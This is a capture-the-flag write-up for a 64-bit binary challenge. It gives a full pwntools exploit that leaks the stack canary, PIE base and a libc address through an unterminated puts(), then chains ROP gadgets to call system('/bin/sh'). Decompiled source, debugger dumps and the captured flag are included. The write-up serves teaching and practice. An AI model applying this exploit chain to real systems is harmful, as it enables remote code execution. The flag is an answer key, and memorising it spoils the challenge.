# The Legend of Firebird
Author: ZD, 650  
Binary  
Description  
Solves 2  

Oh no, UwU is stuck in a time loop that ends every 3 days, can you help him escape?

nc chal.firebird.sh 35037

[File](./file)

[Source](https://letmegooglethat.com/?q=How+to+reverse+engineer)

Solve script template

No libc provided (hint: Not 2.23)
## Solution:
```py
from pwn import * 

binary = "./program_patched"
p = process(binary)
p = remote("chal.firebird.sh", 35037)
elf = ELF(binary)
s = 'b * time_loop+234'
#gdb.attach(p, s)

libc = ELF("libc.so.6")
context.binary = binary

# first day
p.recvuntil(b"hours remaining\n")
p.send(b'A' * 25 )
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
canary_bytes = output[24:32]
canary = u64(canary_bytes)
canary = canary & 0xffffffffffffff00  
print(hex(canary))
# Second day 
p.recvuntil(b"hours remaining\n")
p.send(b'B' * 24 + b'C' * 16) # 
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
return_addr = output[40:46].ljust(8, b'\x00')
return_addr = u64(return_addr)

elf.address = return_addr - 0x1373 
timeloop_address = elf.sym['time_loop']

# Last day, trying to loop back

payload = flat(
    b'B' * 24, # padding to get to canary
    p64(canary),
    b'C' * 8, # padding to get to return address

    p64(elf.address + 0x000000000000101a),
    p64(elf.address + 0x000000000001403),
    p64(3),
    p64(timeloop_address)
)
p.recvuntil(b"hours remaining\n")
p.send(payload)

p.recvuntil(b"hours remaining\n")
p.send(b'A' * 25 )
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")

p.recvuntil(b"hours remaining\n")
p.send(b'C' * 7 + b'D' * 8) # 
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
libc_return_addr = output[40:46].ljust(8, b'\x00')
libc_return_addr = u64(libc_return_addr) - 243



libc.address = libc_return_addr - libc.sym['__libc_start_main'] 
print(hex(libc.address))

payload2 = flat(
    b'B' * 24, # padding to get to canary
    p64(canary),
    b'C' * 8, # padding to get to return address
    p64(elf.address + 0x000000000000101a),
    p64(elf.address + 0x000000000001403),
    p64(next(libc.search(b'/bin/sh'))),
    p64(libc.sym['system'])

)
p.recvuntil(b"hours remaining\n")
p.send(payload2)


p.interactive()

```
Run the script above and you'll get a shell, cat flag.txt and you get the flag! 


## Observation 
```
┌──(kali㉿kali)-[~/Desktop/CTF/legend]
└─$ checksec program  
[*] '/home/kali/Desktop/CTF/legend/program'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
- `FULL RELRO`: libc function addresses are read-only and we cannot do GOT hijacking
- `Canary found`: There is a random value between buffer and `rbp` whcih terminate the rprogram if the value changes. Used to block buffer overflow attack 
- `NX enabled`: No shellcode injection, unlikely since the program has no sections htat are both writable and executable at the same time
- `PIE enabled`: Program addresses are randomized, specifically in `.text`, `.data` and `.bss` sections. We need to defeat `PIE` to be able to return to calculate 
### Source code 
Source was not provided but it can be easily reversed by decompiling with ghidra. Here is the decompiled C code with some variable names changed.
```c

void time_loop(int param_1)

{
  long in_FS_OFFSET;
  int i;
  char *day [4];
  char buffer [24];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  day[0] = "first";
  day[1] = "second";
  day[2] = "last";
  for (i = 0; i < param_1; i = i + 1) {
    printf("Dawn of the %s day\n%d hours remaining\n",day[i],(ulong)(i * -24 + 72));
    read(0,buffer,80);
    puts("So this is what you tried to do to escape?");
    puts(buffer);
  }
  fwrite("3 days have passed",1,0x12,stdout);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

undefined8 main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("You are trapped in a time loop.");
  puts("Everything will reset after 3 days. If you want to escape, you must do it within 3 days");
  time_loop(3);
  puts("You failed to escape, the time loops continues.....");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```c
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
```
in pair with 
```c
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
```
Strongly suggests that `lVar1` is likely canary. But that does not really help anything as we already knew canary exists from `checksec` lul.   
What's helpful is know that we know the canary's position by reading the assembly dump, specifically it is at `rbp-0x8`.
```
    12e1:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    12e8:	00 00 
    12ea:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
```
```
    1384:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
    1388:	64 48 33 14 25 28 00 	xor    rdx,QWORD PTR fs:0x28
    138f:	00 00 
    1391:	74 05                	je     1398 <main+0xc3>
    1393:	e8 18 fd ff ff       	call   10b0 <__stack_chk_fail@plt>
```
### Vulnerabilities
So I was testing the program with random inputs, soon enough we see some buggy outputs:
```
72 hours remaining
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
So this is what you tried to do to escape?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
���yQ
```
`���` might be some unprintable charaters which could be bytes from memory addresses.   
And the thing is, the length of the weird character outputs is different with different length of input

```
aaaaaaaa
So this is what you tried to do to escape?
aaaaaaaa
Zu�
Dawn of the second day
48 hours remaining
bbbbbbbb
So this is what you tried to do to escape?
bbbbbbbb
Zu�
Dawn of the last day


pwndbg> ni
12345678
����
```

A certain length of input always output the same set of weird characters, and sometimes it does not output anything weird characters.   
After a quick chatgpt, I know that it is 
```
puts(buffer);
```
being vulnerable as it print stuff until null terminator `\0`.  
Here is how the memory looks like: 
```
pwndbg> x/32xb $rbp-0x20
0x7ffc0d435a30: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffc0d435a38: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffc0d435a40: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffc0d435a48: 0x00    0x54    0x08    0x43    0xd2    0xc3    0xc6    0x73
pwndbg> x/8xb $rbp-0x8
0x7ffc0d435a48: 0x00    0x54    0x08    0x43    0xd2    0xc3    0xc6    0x73
pwndbg> x/gx $rbp-0x8
0x7ffc0d435a48: 0x73c6c3d243085400
```
Our buffer starts at `rbp-0x20` which is `0x7ffc0d435a30` and `puts(buffer)` would just keep outputing stuff until `0x00` at the start of address `0x7ffc0d435a48`. To add on, `0x7ffc0d435a48` is actually `rbp-0x8`, it is canary and that null byte `0x00` is actually the ending byte of canary as the content is displayed in little endian (backwards).  
In this case, the null byte stops the output and nothing other than those 'AAAA...'s would be printed.

## Attack 
Attack flow:  
1. leak canary to allow going to return address and start ROP chain 
2. leak PIE base address by leaking a `.text` address, e.g. the return address 
3. Going back to `time_loop` and start day 1 and 2 again 
4. leak a libc function address that is spotted on the stack to leak libc version and calculate `system`
5. call `system` with ROP chain on the last day on the second `time_loop` to get a shell 
### First day: Getting canary leaked
```
0x7ffc0d435a48: 0x00    0x54    0x08    0x43    0xd2    0xc3    0xc6    0x73
```
To get this canary leaked, we first have to let the program prints it. Therefore, we have to cover to null byte with something so that the program would continue printing stuff until the next null byte
```
0x7ffc0d435a48: 0x41    0x54    0x08    0x43    0xd2    0xc3    0xc6    0x73
0x7ffc0d435a50: 0x70    0x5a    0x43    0x0d    0xfc    0x7f    0x00 
```
Now, some exact stuff `0x70    0x5a    0x43    0x0d    0xfc    0x7f ` i.e. the `saved old rbp` at `rbp-0x0` would also get printed, we then just need to discard them with some python byte parsing
```py
output = p.recvuntil(b"Dawn")
canary_bytes = output[24:32]
```
There is also one more problem, we modified the null byte of the canary to something else 
```
0x43af40d82882741
```
so we need to recover it
```py
canary = canary & 0xffffffffffffff00 
```
And then we should see something like 
```
0x43af40d82882700
```
We got the canary! 

### Second day: Defeating `PIE`
Since we are able to easily leak the canary value on the stack which is at `rbp-0x08`, we should be able to leak the return address which is nearby at the `rbp+0x8`.  
The intention to leaking that is to leak runtime base address of the program by subtracting the runtime address with fixed function offset.

```py
# Second day 
p.recvuntil(b"hours remaining\n")
p.send(b'B' * 24 + b'C' * 16) # 
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
return_addr = output[40:46].ljust(8, b'\x00')
return_addr = u64(return_addr)

elf.address = return_addr - 0x1373 
timeloop_address = elf.sym['time_loop']
```

### Last day: Looping back to function, `time_loop` 
My original idea was to finish the challenge with just one ROP chain in the last day of the very first loop:  
```py
payload = flat(
    b'B' * 24, # padding up to canary
    p64(canary), # reserved canary value to bypass it
    b'C' * 8, # saved old rbp 
    # 40 bytes already 

    p64(base_addr + 0x000000000001403), # gadget: pop rdi ; ret 
    p64(elf.got['puts'] + base_addr),   # leaking puts address 
    p64(elf.plt['puts'] + base_addr),
    p64(base_addr + 0x000000000001403), 
    p64(3), # argument for time_loop 
    # 40 more bytes written again 

    p64(timeloop_address)
    # In total: 88 bytes
)
```
Since the size of the payload is a bit too large as `read` in this program only takes `80` bytes 
```c
read(0,buffer,80);
```
Then, I figured out that if I go into the second loop using:

the return address pushed onto the stack would be 
```
__libc_start_main+243

x7fffe831fab8 —▸ 0x7f6851cbe083 (__libc_start_main+243) ◂— mov edi, eax
```
which is also a GOT function address. Therefore I got the idea of 
1. leaking libc version by just leaking common libc function addresses at the end of first loop, then change it to go to second loop
```py
# Last day, trying to loop back

payload = flat(
    b'B' * 24, # padding to get to canary
    p64(canary),
    b'C' * 8, # padding to get to return address

    # go straight into second loop to leak libc base address and thus calculate system 
    p64(elf.address + 0x000000000000101a),
    p64(elf.address + 0x000000000001403),
    p64(3),
    p64(timeloop_address)
)
```
2. On the second loop, basically do the similar thing on day 1 and 2, except this time 
- the return address would be a libc address which helps us to calculate libc base and addresses of `system` 
- we don't need to leak canary as it is the same as first loop, it did not reset, according to pure observation in `pwndbg`
```py
# first day, do nothing, no canary to leak as it is the same as the first loop 
p.recvuntil(b"hours remaining\n")
p.send(b'A' * 25 )
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")


# first day of second loop 
p.recvuntil(b"hours remaining\n")
p.send(b'C' * 7 + b'D' * 8) # 
p.recvuntil(b"\n")
output = p.recvuntil(b"Dawn")
libc_return_addr = output[40:46].ljust(8, b'\x00')
libc_return_addr = u64(libc_return_addr) - 243



libc.address = libc_return_addr - libc.sym['__libc_start_main'] 
print(hex(libc.address))
```
The only weird thing is that I am doing the following specifically on second day of second loop
```py
p.send(b'C' * 7 + b'D' * 8) # 
```
as opposed to the first day 
```
p.send(b'B' * 24 + b'C' * 16) # 
```
is because I find out that our `read` function in the second loop does not overwrite the previous written bytes unlike the first loop.  
The overwrite starts after the last written byte in the first day on second loop, very interesting. I am guessing that is because some pointer values in the array corrupted due to unexpected program behaviour of loop back.

After we get `libc.address`, we send a payload on last day to get a shell! 
```py
payload2 = flat(
    b'B' * 24, # padding to get to canary
    p64(canary),
    b'C' * 8, # padding to get to return address
    p64(elf.address + 0x000000000000101a),
    p64(elf.address + 0x000000000001403),
    p64(next(libc.search(b'/bin/sh'))),
    p64(libc.sym['system'])

)
p.recvuntil(b"hours remaining\n")
p.send(payload2)
```
The flag:
```
┌──(kali㉿kali)-[~/Desktop/CTF/legend]
└─$ python solve.py  
[+] Starting local process './program_patched': pid 57486
[+] Opening connection to chal.firebird.sh on port 35037: Done
[*] '/home/kali/Desktop/CTF/legend/program_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/home/kali/Desktop/CTF/legend/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
0xc88c1f37103bab00
0x7f8c73be0000
[*] Switching to interactive mode
So this is what you tried to do to escape?
BBBBBBBBBBBBBBBBBBBBBBBB
3 days have passed$ ls
flag.txt
the_legend_of_firebird
$ cat flag.txt
flag{UwU_n1n73nd0_pl345e_d0nt_5ue_me}
```